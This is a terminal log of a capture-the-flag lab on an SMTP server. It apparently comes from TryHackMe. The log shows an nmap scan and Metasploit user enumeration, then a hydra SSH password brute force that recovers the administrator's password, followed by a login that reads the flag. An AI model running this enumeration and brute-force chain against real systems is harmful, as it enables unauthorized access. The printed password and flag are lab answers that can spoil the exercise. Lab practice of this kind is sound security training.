### SMTP
```
┌──(yuu㉿kali)-[~]
└─$ sudo nmap -Pn -T4 -A --open -p- 10.10.138.115
[sudo] password for yuu:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 15:37 JST
Nmap scan report for 10.10.138.115
Host is up (0.31s latency).
Not shown: 65483 closed tcp ports (reset), 50 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/10%OT=22%CT=1%CU=30650%PV=Y%DS=5%DC=T%G=Y%TM=673
OS:05518%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%
OS:O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W
OS:6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 25/tcp)
HOP RTT       ADDRESS
1   200.60 ms 10.17.0.1
2   ... 4
5   326.15 ms 10.10.138.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.16 seconds

┌──(yuu㉿kali)-[~]
└─$ sudo nmap -Pn -T4 -A --open -F 10.10.138.115
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 15:42 JST
Nmap scan report for 10.10.138.115
Host is up (0.30s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/10%OT=22%CT=7%CU=32178%PV=Y%DS=5%DC=T%G=Y%TM=673
OS:055F5%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=
OS:I%TS=A)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O
OS:2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   198.62 ms 10.17.0.1
2   ... 4
5   322.96 ms 10.10.138.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.58 seconds

┌──(yuu㉿kali)-[~]
└─$ msfconsole
Metasploit tip: When in a module, use back to go back to the top level
prompt


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.34-dev                          ]
+ -- --=[ 2459 exploits - 1266 auxiliary - 430 post       ]
+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > se
search    services  sessions  set       setg
msf6 > search smtp_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_version  .                normal  No     SMTP Banner Grabber


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_version

msf6 > use 0
msf6 auxiliary(scanner/smtp/smtp_version) > options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_version) > exploit

[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.138.115
RHOSTS => 10.10.138.115
msf6 auxiliary(scanner/smtp/smtp_version) > options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.138.115    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_version) > exploit

[+] 10.10.138.115:25      - 10.10.138.115:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.138.115:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smtp/smtp_version) > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum  .                normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

msf6 auxiliary(scanner/smtp/smtp_version) > use 0
msf6 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   RHOSTS                                                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                                                      sing-metasploit.html
   RPORT      25                                            yes       The target port (TCP)
   THREADS    1                                             yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                          yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlis  yes       The file that contains a list of probable users accounts.
              ts/unix_users.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
USER_FILE => /usr/share/seclists/Usernames/top-usernames-shortlist.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   RHOSTS                                                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                                                      sing-metasploit.html
   RPORT      25                                            yes       The target port (TCP)
   THREADS    1                                             yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                          yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/seclists/Usernames/top-usernames-  yes       The file that contains a list of probable users accounts.
              shortlist.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.138.115
RHOSTS => 10.10.138.115
msf6 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   RHOSTS     10.10.138.115                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                                                      sing-metasploit.html
   RPORT      25                                            yes       The target port (TCP)
   THREADS    1                                             yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                          yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/seclists/Usernames/top-usernames-  yes       The file that contains a list of probable users accounts.
              shortlist.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 10.10.138.115:25      - 10.10.138.115:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.138.115:25      - 10.10.138.115:25 Users found: administrator
[*] 10.10.138.115:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smtp/smtp_enum) > exit

┌──(yuu㉿kali)-[~]
└─$ hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.138.115 ssh -t 16
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-10 17:30:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.138.115:22/
[22][ssh] host: 10.10.138.115   login: administrator   password: alejandro
[STATUS] attack finished for 10.10.138.115 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-10 17:31:17

┌──(yuu㉿kali)-[~]
└─$ ssh administrator@10.10.138.115
The authenticity of host '10.10.138.115 (10.10.138.115)' can't be established.
ED25519 key fingerprint is SHA256:6VV0TI4MQmKeRImOTQ8lj3uk863uVqWS+zh2fF2LLF8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.138.115' (ED25519) to the list of known hosts.
administrator@10.10.138.115's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 10 08:33:22 UTC 2024

  System load:  0.04              Processes:           90
  Usage of /:   43.9% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.138.115
  Swap usage:   0%


87 packages can be updated.
35 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
administrator@polosmtp:~$ ls -laF
total 52
drwxr-xr-x 6 administrator vagrant 4096 Apr 22  2020 ./
drwxr-xr-x 4 root          root    4096 Jul 15  2020 ../
-rw------- 1 administrator vagrant  852 Jul  1  2020 .bash_history
-rw-r--r-- 1 administrator vagrant  220 Apr 22  2020 .bash_logout
-rw-r--r-- 1 administrator vagrant 3771 Apr 22  2020 .bashrc
drwx------ 2 administrator vagrant 4096 Apr 22  2020 .cache/
-rw------- 1 administrator vagrant  136 Apr 22  2020 dead.letter
drwx------ 3 administrator vagrant 4096 Apr 22  2020 .gnupg/
drwxrwxr-x 5 administrator vagrant 4096 Apr 22  2020 Maildir/
-rw-r--r-- 1 administrator vagrant  807 Apr 22  2020 .profile
-rw------- 1 administrator vagrant 1024 Apr 22  2020 .rnd
-rw-r--r-- 1 root          root      39 Apr 22  2020 smtp.txt
drwx------ 2 administrator vagrant 4096 Apr 22  2020 .ssh/
administrator@polosmtp:~$ cat smtp.txt
THM{who_knew_email_servers_were_c00l?}
administrator@polosmtp:~$ whoami
administrator
```
